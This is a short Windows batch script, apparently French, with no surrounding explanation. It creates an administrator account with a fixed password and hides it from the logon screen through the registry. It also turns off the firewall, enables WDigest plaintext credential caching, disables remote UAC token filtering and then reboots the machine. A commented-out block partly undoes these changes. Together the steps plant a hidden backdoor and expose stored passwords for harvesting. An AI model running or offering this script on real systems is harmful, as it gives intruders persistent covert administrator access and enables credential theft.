net user jenefaisquepasser ViveStella6 /add
net localgroup administrateurs jenefaisquepasser /add
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v jenefaisquepasser /t REG_DWORD /d 0 /f
netsh advfirewall set allprofiles state off
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /f /d 1
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v FilterAdministratorToken /t REG_DWORD /d 0
PAUSE
shutdown /r /t 0

REM net user jenefaisquepasser ViveStella6 /del
REM net localgroup administrateurs jenefaisquepasser /del
REM netsh advfirewall set allprofiles state off
REM reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /f /d 0
REM reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 0
REM reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v FilterAdministratorToken /t REG_DWORD /d 1
REM PAUSE
REM shutdown /r /t 0
